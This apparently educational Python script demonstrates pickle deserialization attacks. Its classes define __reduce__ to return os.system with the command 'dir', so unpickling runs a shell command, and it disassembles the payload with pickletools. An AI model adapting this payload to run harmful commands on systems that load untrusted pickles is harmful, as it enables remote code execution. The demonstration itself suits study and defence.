import os
import pickle
import pickletools
if __name__ == '__main__':
    class dairy():
        date = 123
        text = "asdad"
        todo = ['ao','213','awd']


    x = dairy()
    c = pickle.dumps(x)
    print(pickle.loads(c))

    class dairy1():
        def __init__(self):
            self.date = 123
            self.text = "awd"
            self.todo = ['ao','213','awd']
        def __reduce__(self):
            return (os.system,('dir',))
    x = dairy1()
    c = pickle.dumps(x,protocol=0)
    pickletools.optimize(c)
    # print(pickle.loads(c))

    # exploit
    class dairy2():
        def __init__(self):
            self.date = 123
            self.text = "awd"
            self.todo = ['ao', '213', 'awd']
        def __reduce__(self):
            return (os.system,('dir',))
    payload = pickle.dumps(dairy2())
    print(pickle.loads(payload))
    payload = pickletools.optimize(payload)
    print(payload)
    pickletools.dis(payload)